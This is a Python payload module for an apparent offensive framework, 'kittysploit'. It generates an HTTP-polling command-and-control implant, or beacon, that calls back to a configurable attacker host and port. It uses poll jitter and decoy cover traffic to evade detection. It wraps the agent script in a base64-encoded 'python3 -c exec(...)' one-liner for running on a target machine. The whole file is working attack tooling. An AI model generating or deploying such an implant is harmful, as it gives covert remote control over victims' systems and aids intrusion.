from kittysploit import *

from lib.c2.http_polling_agent import build_http_polling_agent_script


class Module(Payload):

    CLIENT_LANGUAGE = "python"

    __info__ = {
        "name": "Multi Python HTTP Polling Beacon",
        "description": "HTTP polling implant with jitter, cover traffic, and Ed25519 implant identity",
        "category": PayloadCategory.CMD,
        "arch": Arch.PYTHON,
        "platform": Platform.MULTI,
        "listener": "listeners/multi/reverse_http_polling",
        "handler": Handler.REVERSE,
        "session_type": SessionType.POLLING,
    }

    lhost = OptString("127.0.0.1", "Callback host", True)
    lport = OptPort(8088, "Callback port", True)
    url_prefix = OptString("/c2", "URL prefix (must match listener)", False, True)
    client_id = OptString("", "Client/implant ID (auto with implant_identity)", False, True)
    poll_interval = OptInteger(10, "Base poll interval seconds", False, True)
    jitter_percent = OptInteger(35, "Poll jitter percent", False, True)
    cover_traffic = OptBool(True, "Send decoy HTTP requests between polls", False, True)
    use_ssl = OptBool(False, "Use HTTPS callback", False, True)
    python_binary = OptString("python3", "Python interpreter on target", True)

    def generate(self):
        identity = self._apply_implant_identity_options()
        client_id = str(getattr(getattr(self, "client_id", None), "value", self.client_id) or "").strip()
        if identity:
            client_id = identity.implant_id
        elif not client_id:
            client_id = "agent1"

        script = build_http_polling_agent_script(
            str(self.lhost),
            int(self.lport),
            client_id,
            url_prefix=str(self.url_prefix or "/c2"),
            poll_interval=float(self.poll_interval or 10),
            jitter_percent=float(self.jitter_percent or 35),
            cover_traffic=bool(self.cover_traffic),
            use_ssl=bool(self.use_ssl),
            private_key_pem=identity.private_key_pem if identity else None,
        )

        import base64 as b64

        encoded = b64.b64encode(script.encode("utf-8")).decode("ascii")
        py = str(self.python_binary)
        return f'{py} -c "import base64;exec(base64.b64decode(\'{encoded}\').decode())"'
